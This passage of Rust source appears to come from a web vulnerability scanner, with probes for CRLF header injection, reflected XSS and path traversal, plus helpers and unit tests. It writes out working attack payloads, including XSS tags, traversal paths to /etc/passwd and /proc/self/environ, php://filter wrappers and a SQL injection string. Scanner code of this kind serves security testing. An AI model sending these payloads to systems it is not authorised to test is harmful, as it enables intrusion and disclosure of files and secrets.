    // CRLF (the latter starts a new body, catching stricter parsers).
    for pl in [
        format!("{base}\r\nX-Cfx-Inj: {marker}"),
        format!("{base}%0d%0aX-Cfx-Inj: {marker}"),
    ] {
        let hit = |r: &Option<Resp>| {
            r.as_ref()
                .and_then(|x| x.header("x-cfx-inj"))
                .map(|v| v == marker)
                .unwrap_or(false)
        };
        let r1 = send_site(client, site, &pl).await;
        if hit(&r1) {
            let r2 = send_site(client, site, &pl).await;
            if hit(&r2) {
                return Some(finding(
                    "crlf",
                    "CRLF / HTTP response header injection",
                    "high",
                    site,
                    format!(
                        "A CR/LF sequence injected into the {} was copied into the response headers (our injected `X-Cfx-Inj` header appeared), so an attacker can inject arbitrary response headers - session fixation via `Set-Cookie`, cache poisoning, or response splitting.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
    let marker = format!("cfx{}z{}", site.url.len(), site.param.len());
    let plain = send_site(client, site, &marker).await?;
    if !plain.body.contains(&marker) {
        return None; // not reflected at all
    }
    // SOUND oracle: every payload injects a full HTML TAG carrying an event handler, and the detector
    // is that ENTIRE tag. It fires ONLY when the tag reflects with `<`, the tag name, and `>` all raw
    // (a genuine markup breakout). We deliberately do NOT use payloads that need no structural char - a
    // bare `onfocus=`/`onmouseover=` "unquoted-attribute" string, or a `';alert()//` JS-string break -
    // because those match ANY raw reflection, including a value echoed as plain text inside an error
    // page. On an app that HTML-encodes `<`/`>`/`"` (e.g. ASP.NET default), those strings still reflect
    // verbatim and produced a FALSE POSITIVE; requiring the intact `<tag ...>` makes the app's encoding
    // of `<`/`>` the discriminator, which is exactly what determines exploitability.
    let m = &marker;
    let cases: [(&str, String, String); 3] = [
        (
            "HTML",
            format!("{m}\"'><img src=x onerror=alert({m})>"),
            format!("<img src=x onerror=alert({m})>"),
        ),
        (
            "HTML",
            format!("{m}\"'><svg onload=alert({m})>"),
            format!("<svg onload=alert({m})>"),
        ),
        (
            "<script>",
            format!("{m}</script><svg onload=alert({m})>"),
            format!("</script><svg onload=alert({m})>"),
        ),
    ];
    for (ctx, payload, detector) in &cases {
        let r = send_site(client, site, payload).await;
        if r.map(|x| x.body.contains(detector.as_str()))
            .unwrap_or(false)
        {
            let again = send_site(client, site, payload).await;
            if again
                .map(|x| x.body.contains(detector.as_str()))
                .unwrap_or(false)
            {
                return Some(finding(
                    "xss",
                    "Reflected cross-site scripting (XSS)",
                    "high",
                    site,
                    format!(
                        "A payload injected into the {} was reflected into the {} response with `<`, `>` and the tag intact (`{}` appears raw and unescaped), so the injected markup executes in the victim's browser.",
                        site.where_label(),
                        ctx,
                        detector
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- LFI / traversal
/// What a response leaked for a given LFI payload, or None. Handles Unix/Windows file reads,
/// `/proc/self/environ` disclosure, and PHP source via the `php://filter` wrapper (raw `<?php` or its
/// base64 signature `PD9waHA`).
/// What a response leaked, given what the endpoint says WITHOUT a payload.
///
/// Every branch requires the marker to be absent from the baseline, because a
/// page that already contains it proves nothing. That is not hypothetical: the
/// php:// branch reported seven file-read findings against a static
/// `mutillidae-test-scripts.txt`, a documentation file full of `<?php`
/// examples, which contains the marker no matter what we send.
fn lfi_leak(payload: &str, body: &str, baseline: &str) -> Option<&'static str> {
    let win = |b: &str| {
        b.contains("[extensions]") || b.contains("[fonts]") || b.contains("for 16-bit app support")
    };
    let environ = |b: &str| {
        b.contains("HTTP_HOST=")
            || b.contains("HTTP_USER_AGENT=")
            || (b.contains("PATH=") && b.contains("PWD="))
    };
    let php = |b: &str| b.contains("<?php") || b.contains("<?=") || b.contains("PD9waHA");

    if is_passwd(body) && !is_passwd(baseline) {
        return Some("/etc/passwd");
    }
    if win(body) && !win(baseline) {
        return Some("windows/win.ini");
    }
    if payload.contains("self/environ") && environ(body) && !environ(baseline) {
        return Some("/proc/self/environ");
    }
    if payload.starts_with("php://") && php(body) && !php(baseline) {
        return Some("PHP source via php:// wrapper");
    }
    None
}

async fn probe_lfi(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if is_passwd(&baseline.body) {
        return None;
    }
    let payloads = [
        "../../../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        // process environment (often readable when /etc/passwd is not, and leaks secrets/session)
        "../../../../../../../../proc/self/environ",
        // Windows: relative traversal + absolute paths
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",
        // PHP wrapper source disclosure (raw + base64)
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/resource=index.php",
    ];
    for p in payloads {
        // As in probe_ssti: a failed request costs that payload, not the rest.
        // This is what actually hid Mutillidae's `?page=` file read - the probe
        // aborted on a timeout while the same target was being hit by the
        // time-based command-injection probe on another worker.
        let Some(r) = send_site(client, site, p).await else {
            continue;
        };
        if let Some(what) = lfi_leak(p, &r.body, &baseline.body) {
            let Some(again) = send_site(client, site, p).await else {
                continue;
            };
            if lfi_leak(p, &again.body, &baseline.body).is_some() {
                return Some(finding(
                    "lfi",
                    "Local file inclusion / path traversal",
                    "high",
                    site,
                    format!(
                        "A traversal/wrapper payload in the {} returned `{what}` -- the parameter is used to build a file path without containment.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- helpers
/// True if the true/false responses split cleanly around the baseline. `min_diff` is the noise floor
/// derived from baseline jitter (dynamic pages with tokens/timestamps wobble in size), so a page that
/// merely varies run-to-run does not read as a boolean oracle. Accepts EITHER direction: usually the
/// true (baseline-equivalent) branch is the larger one (row present vs absent), but some apps render
/// more on the false branch, so we anchor on "one branch tracks the baseline, the other diverges past
/// the split" rather than assuming true > false.
fn boolean_differential(baseline: &Resp, t: &Resp, f: &Resp, min_diff: i64) -> bool {
    if !(200..500).contains(&t.status) || !(200..500).contains(&f.status) {
        return false;
    }
    let lb = baseline.body.len() as i64;
    let (lt, lf) = (t.body.len() as i64, f.body.len() as i64);
    let diff = (lt - lf).abs();
    if diff < min_diff.max(16) {
        return false;
    }
    let t_side = lt >= lf && (lt - lb).abs() <= diff; // true tracks baseline, false shrank
    let f_side = lf > lt && (lf - lb).abs() <= diff; // false tracks baseline, true shrank
    t_side || f_side
}

fn finding(class: &str, name: &str, severity: &str, site: &Site, detail: String) -> Value {
    Finding::new("cortex-inject", class, name, severity, &site.url)
        .method(&site.method)
        .param(&site.param)
        .location(match site.loc {
            Loc::Query => "query",
            Loc::Path => "path",
            Loc::Header => "header",
            _ => "body",
        })
        .describe(detail)
        .build()
}

fn query_param_names(url: &str) -> Vec<String> {
    let q = match url.split_once('?') {
        Some((_, q)) => q.split('#').next().unwrap_or(q),
        None => return Vec::new(),
    };
    let mut out = Vec::new();
    for pair in q.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if !k.is_empty() && !out.contains(&k.to_string()) {
            out.push(k.to_string());
        }
    }
    out
}

fn current_value(url: &str, param: &str) -> Option<String> {
    let q = url
        .split_once('?')
        .map(|(_, q)| q.split('#').next().unwrap_or(q))?;
    for pair in q.split('&') {
        if let Some((k, v)) = pair.split_once('=') {
            if k == param {
                return Some(pct_decode(v));
            }
        } else if pair == param {
            return Some(String::new());
        }
    }
    None
}

fn set_param(url: &str, param: &str, value: &str) -> String {
    let (base, frag) = match url.split_once('#') {
        Some((b, f)) => (b, Some(f)),
        None => (url, None),
    };
    let (path, query) = match base.split_once('?') {
        Some((p, q)) => (p, q),
        None => (base, ""),
    };
    let enc = pct_encode(value);
    let mut parts: Vec<String> = Vec::new();
    let mut replaced = false;
    for pair in query.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if k == param {
            parts.push(format!("{param}={enc}"));
            replaced = true;
        } else {
            parts.push(pair.to_string());
        }
    }
    if !replaced {
        parts.push(format!("{param}={enc}"));
    }
    let mut out = format!("{path}?{}", parts.join("&"));
    if let Some(f) = frag {
        out.push('#');
        out.push_str(f);
    }
    out
}

use crate::probe::{is_passwd, is_sql_error};
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;
#[cfg(test)]
mod scope_tests {
    use super::in_scope;

    #[test]
    fn an_off_site_form_action_is_refused() {
        let target = "http://127.0.0.1:7012/";
        assert!(in_scope(target, "http://127.0.0.1:7012/index.php?page=a"));
        assert!(in_scope(target, "http://127.0.0.1:7012/x"));
        assert!(!in_scope(target, "https://www.paypal.com/cgi-bin/webscr"));
        assert!(!in_scope(target, "https://evil.example/collect"));
    }

    #[test]
    fn a_port_difference_on_the_named_host_is_still_in_scope() {
        assert!(in_scope("http://app.test/", "http://app.test:8443/api"));
    }

    #[test]
    fn no_target_means_the_caller_is_trusted() {
        assert!(in_scope("", "https://anything.example/"));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn json_body_keeps_baseline_fields_typed_and_fuzzes_as_string() {
        // name (string, fuzzed) + ownerId (integer) + enabled (boolean) + tags (array).
        let site = Site {
            method: "POST".into(),
            url: "https://api.x/pets".into(),
            loc: Loc::BodyJson,
            param: "name".into(),
            base_value: "test".into(),
            body: vec![
                ("name".into(), "test".into(), Some("string".into())),
                ("ownerId".into(), "1".into(), Some("integer".into())),
                ("enabled".into(), "true".into(), Some("boolean".into())),
                ("tags".into(), "[]".into(), Some("array".into())),
            ],
            path_idx: 0,
        };
        let (_url, body) = site.render("' OR '1'='1");
        let (raw, ct) = body.expect("json body");
        assert_eq!(ct, "application/json");
        let v: Value = serde_json::from_str(&raw).unwrap();
        // fuzzed field is the payload string
        assert_eq!(v["name"], Value::String("' OR '1'='1".into()));
        // baseline fields keep their declared JSON types
        assert_eq!(v["ownerId"], Value::from(1i64));
        assert_eq!(v["enabled"], Value::Bool(true));
        assert_eq!(v["tags"], serde_json::json!([]));
    }
}
